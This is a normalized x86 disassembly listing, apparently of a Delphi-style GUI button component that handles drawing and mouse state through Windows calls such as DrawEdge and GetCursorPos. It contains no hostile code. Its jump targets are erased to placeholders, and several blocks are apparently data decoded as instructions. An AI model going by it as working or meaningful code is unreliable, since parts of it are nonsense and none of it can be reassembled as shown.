mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42e108
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42dddc
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42db98
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42dcfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42e178
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cc08
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42e19c
push ebx
mov ebx eax
mov eax ebx
call sub_44a524
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42e1e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42e218
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42eac8
sub_42e238
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42eb54
sub_42e258
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d3bc
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42ea88
mov ecx esi
xor edx edx
mov eax ebx
call sub_445940
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43dff0
mov edx 0xff00000f
mov eax ebx
call sub_43e064
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42e318
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44599c
mov eax [ esi + 0x16c ]
call sub_40326c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42e350
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42e77a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41d548
call sub_42f650
call sub_42f730
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412594
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41d628
mov edx eax
mov eax esi
call sub_43b018
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42f650
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42fa54
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f83c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f7a0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42f650
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42f994
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f83c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f7a0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41ce60
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d204
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_41256c
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43dec4
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_4401f0
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42e108
mov edx 0xff000014
mov eax 0xff00000f
call sub_423670
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41ce34
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d204
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e781
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_41256c
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c694
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43dec4
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_4401f0
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42e108
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42e788
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c770
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43f0c4
jmp r-xdata
sub_42e7ec
push ebx
mov ebx eax
mov eax ebx
call sub_43ffcc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42d5c0
pop ebx
retn
sub_42e818
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43f4d8
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e870
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f790
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42e788
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43d8c8
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43d90c
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42e910
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f838
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43d8c8
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43d90c
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42eac8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42e788
mov eax ebx
mov si 0xffeb
call sub_403468
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42ea5c
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42d598
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ea90
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_441448
sub_42eac8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42ea90
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42ebc0
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ec30
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42d5c0
mov eax ebx
call sub_42e788
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42ec64
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44a7b8
sub_42ecd4
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ed5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455a9c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403468
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed64
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_42eda0
push ebx
push esi
mov esi eax
mov eax esi
call sub_43fc3c
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42f650
call sub_42f730
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42ee14
push ebx
push esi
mov esi eax
mov eax esi
call sub_43fc54
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42f650
call sub_42f730
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42ee7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42ea2c
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41ce60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412594
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_421afc
pop edx
call sub_41d204
push 0x0
push edi
push 0x1
mov eax ebx
call sub_421afc
mov edx eax
xor ecx ecx
mov eax esi
call sub_44bb3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ef0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43fde4
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42eb54
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ea2c
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44b624
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42ee7c
pop ecx
sub_42efc8
or al [ eax ]
add [ eax ] al
inc esp
fld [ esi ]
add al ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x27 ] al
inc esi
add al dl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
cmp al 0xd9
inc esi
add [ esi + ebx * 8 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] bh
fld [ esi ]
pushad
fild [ esi ]
add [ eax ] al
add [ eax ] al
xor al 0xd9
inc esi
add [ eax ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] dh
fld [ esi ]
xor dl ah
inc esi
add [ eax ] al
xor cl bl
inc esi
add [ eax ] dh
loop r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 ] ah
inc esi
add [ edx ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
fld [ esi ]
xchg esp eax
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f070
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 ] ch
inc esi
add [ eax - 0x20 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fld [ esi ]
loopne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f077
retn
call sub_42efac
sub_42f0a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f0c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f0d0
retn
sub_42f0eb
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f130
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f137
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a44
sub_42f153
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f198
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f19f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a44
sub_42f1af
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f205
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f20c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403fbc
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f218
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f25c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f263
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f270
push ebp
